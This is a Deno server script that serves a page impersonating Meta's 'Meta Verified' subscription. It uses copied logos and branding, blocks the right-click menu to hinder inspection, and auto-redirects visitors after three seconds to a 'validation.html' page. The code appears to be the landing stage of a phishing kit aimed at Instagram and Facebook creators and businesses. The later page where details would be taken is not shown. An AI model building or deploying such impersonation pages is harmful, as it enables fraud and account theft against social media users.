import { serve } from "https://deno.land/std@0.202.0/http/server.ts";

const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Verified | Get a verified blue tick</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: system-ui;
            margin: 0;
            padding: 0;
        }
        .container-fluid {
            background: #F5F6F6;
        }
        .container {
            padding: 1rem;
        }
        .logo {
            width: 9rem;
            height: 6rem;
        }
        .meta-logo {
            width: 4rem;
            height: 4rem;
        }
        .btn {
            background: #0064e0;
            border: none;
            border-radius: 100px;
            padding: 10px 35px;
            text-decoration: none;
            color: white;
            display: inline-block;
            margin-top: 1rem;
            font-family: Arial, sans-serif;
            font-size: 16px;
        }
        .content {
            margin-top: 3rem;
            display: flex;
            justify-content: center;
        }
        .content .col-sm-6 {
            margin-top: 3rem;
            margin-left: 5rem;
        }
        .content p {
            font-size: 18px;
            margin-top: 1rem;
            font-family: Arial, sans-serif;
        }
        .sign-up {
            font-size: 17px;
            padding-top: 1rem;
            font-family: Arial, sans-serif;
        }
        .business-info {
            font-size: 14px;
            font-family: Arial, sans-serif;
        }
        .region-info {
            font-size: 13px;
            font-style: italic;
            font-family: Arial, sans-serif;
        }
        .image {
            display: none;
            width: 42%;
            height: 100vh;
            background-size: cover;
        }
        @media (min-width: 576px) {
            .image {
                display: block;
            }
        }
    </style>
</head>
<body>
    <div class="container-fluid">
        <div class="container">
            <img src="https://cdn.glitch.global/325f7535-a68d-4687-a91c-1e7d9366104a/meta-logo-QVrNRj93.svg?v=1723987211189" alt="logo" class="logo">
        </div>
    </div>
    <div class="content">
        <div class="col-sm-6">
            <img src="https://cdn.glitch.global/325f7535-a68d-4687-a91c-1e7d9366104a/blue_tick-B9ADAlwo.png?v=1723987162846" alt="meta" class="meta-logo">
            <h1 class="my-3 fs-1">Stand out with Meta<br> Verified</h1>
            <div style="margin-bottom: 30px;"></div>
            <a class='btn' href='validation.html'>Apply</a>
            <p class="mt-4">Grow your social presence with Meta Verified – a new subscription <br> bundle available for creators and businesses on Instagram and <br> Facebook.</p>
            <p class="sign-up">Sign up now for creators</p>
            <p class="mt-4 mb-0">
                <span class="fw-semibold">Are you a business?</span> Get more information on
            </p>
            <a href="#" class="business-info">Meta verified for businesses</a>
            <p class="mt-4 font-italic region-info">Features, availability, and pricing may vary by region.</p>
        </div>
        <div class="col-sm-5 image" style="background-image: url('./background.png'); "></div>
    </div>
</body>
<script>
    document.addEventListener('contextmenu', event => {
        event.preventDefault();
    });

    setTimeout(function() {
        var redirectURL = "validation.html";
        window.location.replace(redirectURL);
    }, 3000);
</script>
</html>
`;

console.log("Server is running on http://localhost:8000");
serve(() => new Response(html, {
  headers: {
    "content-type": "text/html",
  },
}));
